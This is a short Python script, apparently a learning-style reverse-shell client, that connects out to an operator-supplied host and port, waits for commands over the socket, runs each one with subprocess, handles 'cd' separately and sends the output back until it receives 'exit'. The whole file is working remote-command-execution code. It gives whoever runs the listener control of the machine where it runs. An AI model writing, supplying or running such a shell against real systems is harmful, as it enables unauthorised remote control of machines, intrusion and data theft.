import socket # network stuff
import sys # command line input 
import os
import subprocess # run other programs

# input host ip address and port number at the command line like:
# python client.py 0.0.0.0 5050

HOST = sys.argv[1] 
PORT = int(sys.argv[2])

def main():
    with socket.socket() as s:
        s.connect((HOST, PORT))
        stay_open = True
        while stay_open:
            # data is sent & received in bytes
            # needs decoding
            command = s.recv(1024).decode() 
            if len(command) > 0:
                print(command)
                if command == 'exit':
                    stay_open = False
                if command[:2] == 'cd':
                    os.chdir(command[2:].strip())
                    s.send(os.getcwd().encode())
                else:
                    try:
                        output = subprocess.check_output(command.split()).decode()
                        s.send(output.encode())
                    except Exception as e:
                        s.send(str(e).encode())




if __name__ == '__main__':
    main()
